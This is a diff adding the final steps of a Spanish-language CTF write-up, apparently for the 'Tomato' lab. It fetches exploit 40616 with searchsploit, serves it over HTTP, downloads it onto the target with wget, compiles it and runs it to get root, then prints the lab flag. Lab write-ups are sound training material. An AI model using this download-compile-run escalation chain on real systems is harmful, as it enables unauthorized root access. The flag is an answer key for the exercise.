@@ -127,4 +127,28 @@ Versión del kernel: `4.4.0-21-generic`
 ```
 searchsploit -m 40616
 ```
-![16](https://user-images.githubusercontent.com/75953873/175180660-31b64ace-44da-4f47-8ee1-5360af2292a3.png)
+![16](https://user-images.githubusercontent.com/75953873/175180708-73e2c433-0d55-4b51-bba3-0c091d47cd9e.png)
+
+Abrir un servidor local en el puerto 80 con Python3:
+```
+python3 -m http.server 5555
+```
+![17](https://user-images.githubusercontent.com/75953873/175180828-acafd971-a17b-49cc-9458-6fdaaab0fb88.png)
+
+Descargar exploit en el directorio `/tmp` y compilar.
+```
+cd /tmp
+wget http://192.168.1.9:5555/40616.c
+gcc-5 40616.c -o get_root -pthread
+```
+![18](https://user-images.githubusercontent.com/75953873/175181097-cbd94b3e-17ef-47bc-b402-2df1125275b5.png)
+
+Ejecutar exploit y capturar la flag del directorio `/root`:
+```
+./get_root
+cd /root
+cat proof.txt
+```
+![19](https://user-images.githubusercontent.com/75953873/175181278-eb17c6e9-93ff-497c-9498-43b9bc9c33a5.png)
+
+**FLAG:** Sun_CSR_TEAM_TOMATO_JS_0232xx23
